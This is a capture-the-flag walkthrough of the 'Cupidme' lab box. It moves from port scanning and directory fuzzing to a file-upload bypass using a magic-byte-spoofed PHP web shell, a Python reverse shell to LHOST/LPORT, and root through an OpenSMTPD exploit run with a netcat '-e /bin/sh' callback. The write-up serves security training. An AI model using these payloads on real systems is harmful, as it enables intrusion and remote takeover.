# Box: Cupidme
# Level: Intermediate
# OS: Linux
<hr>

Lets get started

# Recon

## Portscanning

command:```sudo nmap -A 10.0.30.187 -T4  -v -p-```

```
Nmap scan report for 10.0.30.187
Host is up (0.16s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to Cupid's homepage
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.14.2
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=9/27%OT=80%CT=1%CU=43908%PV=Y%DS=1%DC=T%G=Y%TM=651449B
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=RI%II=I%TS=C)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=FB34%W2=FB34%W3=FB34%W4=FB34%W5=FB34%W6=FB34)EC
OS:N(R=Y%DF=N%T=40%W=FD5C%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=N%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=41%W=0%S=A%A=S%F=AR%O=%RD=0%Q=)T5
OS:(R=Y%DF=N%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=41%W=0%S=A%A=S
OS:%F=AR%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 9.763 days (since Sun Sep 17 22:07:50 2023)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   159.76 ms 10.0.30.187

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 27 16:26:54 2023 -- 1 IP address (1 host up) scanned in 1479.44 seconds
```
From our scan we have only 1 open port, so our enumeration will be focused on that port




# Enumeration 

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/57455236-6563-4073-9aa1-42af759dead3)

Lets fuzz for directories

command:```ffuf -u "http://10.0.30.187/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/EchoCtf/cupidme]
└─$ ffuf -u "http://10.0.30.187/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .zip,.sql,.php,.phtml,.bak,.backup

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.30.187/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .zip .sql .php .phtml .bak .backup 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 167ms]
index.php               [Status: 200, Size: 1805, Words: 92, Lines: 2, Duration: 171ms]
index.php               [Status: 200, Size: 1805, Words: 92, Lines: 2, Duration: 547ms]
LICENSE                 [Status: 200, Size: 1075, Words: 152, Lines: 19, Duration: 166ms]
upload.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 161ms]
:: Progress: [32305/32305] :: Job [1/1] :: 137 req/sec :: Duration: [0:02:46] :: Errors: 0 ::
```
Navigating to the ```images``` directory I got a ```403 error```. 

Lets navaigate to the ```/upload.php``` directory

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cf7c2a44-346c-4dbb-884c-3935990b6131)

As you can see we get redirected back to the main page.

Checking the page source,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9122bbbb-3a8d-4b75-b504-7420ad97032e)

Well, this is the reason why we can't view the ```/upload.php``` directory. The HTML code is commented.

To solve this we have to uncomment that part of the code. We'll be using the developer tools for this

So, right-click and inspect element

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c16de178-3964-49f4-ae0a-02b2fe8912bf)

Click on that drop down

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e6c40a03-3e0b-4f8b-9352-3fe8d65917a5)

Click on that also,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a65d193a-6025-4513-8004-5c1f0382600c)

Good, so our goal is to uncomment that part of the code.

Now, right-click and click on ```Edit As HTML```, we'll be removing the comments ```<!--``` and ```-->```

Doing that should get you this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/76b4abc6-648f-4531-b93c-335f3fbfc383)

As you can see  we can now access the upload button.



# Exploitation

Lets try to upload something, say a ```.jpg``` file

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4bd42d2a-5f42-447a-9100-8c8b67a0ce91)

oops, the file size supported is 39 bytes. So there's a filter in this upload function

1.Upload a .jpeg file 

2.The maximum size of the .jpeg file must be 39 bytes

These are the 2 filters in the upload function

Reading this [blog](https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/) talks about how to bypass file upload restrictions

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/11b52f62-d434-4baa-b702-fa5e10cebfee)

This is the method we'll be using

payload:```AAAA<?php system($_GET[‘cmd’]); ?>```

Save this in a file ```bankai.php```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/EchoCtf/cupidme]
└─$ nano bankai.php 
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/EchoCtf/cupidme]
└─$ cat bankai.php 
AAAA<?php system($_GET[‘cmd’]); ?>
```
Now, this is a php script, what we'll do is change the magic bytes header from a ```.php``` to a ```.jpeg```

To access the magic bytes of the file, we'll use ```hexeditor```

command:```hexeditor bankai.php```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8a33d3a2-05c8-4b42-8d2f-afc17283ee5c)

We'll be changing that from ```41 41 41 41``` to ```FF D8 FF EE```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/922fd96c-89fc-4e5e-9ce6-6f4f4b22f03d)

To save and exit, hit ```ctrl + x```

```
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/EchoCtf/cupidme]
└─$ cat bankai.php 
<?php system($_GET[‘cmd’]); ?>
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/EchoCtf/cupidme]
└─$ file bankai.php   
bankai.php: JPEG image data
```
Good, now lets try to upload this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0eab6a04-a242-4526-a165-5e502427246c)

It worked hehe😎

Navigating to where the file was uploaded to

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5fd58f04-d694-4562-b347-a585b25d8b31)

Cool, we get this. Now add ```?cmd=id``` to the back of the url

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/30a88dbf-55e2-40c9-8f4d-7d69c5162cdf)

Nice, now lets get a reverse shell back to our machine

payload:```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'```

Ensure you edit the ```LHOST``` and ```LPORT``` to that which applies to you

Before running that payload, I set up my netcat listener already

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d5d633ab-8c39-4e06-a8fc-200258d973f0)

Using the payload,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/86052224-f64c-41a6-8df9-9e09f4b5d791)

Checking my netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9a0fd000-34cc-4ca1-b09b-d2ca45c0ab73)

We got a shell back to our machine. 

To stabilize this shell

commands
```
python3 -c “import pty;pty.spawn(‘/bin/bash’)”
ctrl + z (to background)
stty raw -echo && fg
export TERM=xterm
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/98ed5cf6-b97f-4b86-8cd1-c5f898015d2b)

Lets go ahead and escalate our privileges




# Privilege Escalation

I ran linpeas, and found this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/82b934d9-08fa-4441-9cd7-e5b0a75edfad)

Port 25 is active on this box, it is being ran locally

Lets try to test SMTP connectivity

command:```nc -vn 127.0.0.1 25```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/840acd73-20f5-4a0e-b24b-06d61786ff63)

So the port is running ```OpenSMTPD```

Checking for exploits, I found this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5b5a6dd0-1195-4281-a958-8c7c52662dfa)

Download the exploit [here](https://www.exploit-db.com/exploits/47984) and send  it over to the target

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e2870d7a-d517-4134-98b8-1b7297e9303c)

To run the script

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0bc269a3-cced-4ee2-b2a5-98161ab618ab)

Our command would look like this

command:```python3 47984.py 127.0.0.1 'nc LHOST LPORT -e /bin/sh'```

Ensure you edit the ```LHOST``` and ```LPORT```

Setting a netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2b9bb607-618b-4855-aac0-be78e95b871d)

Running the script

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4547c5bb-8182-492c-a3f0-48f1fabed150)

We got root shell, we have successfully pwned this box😎


That will be all for today
<br><br>
[Back To Home](../index.md)




















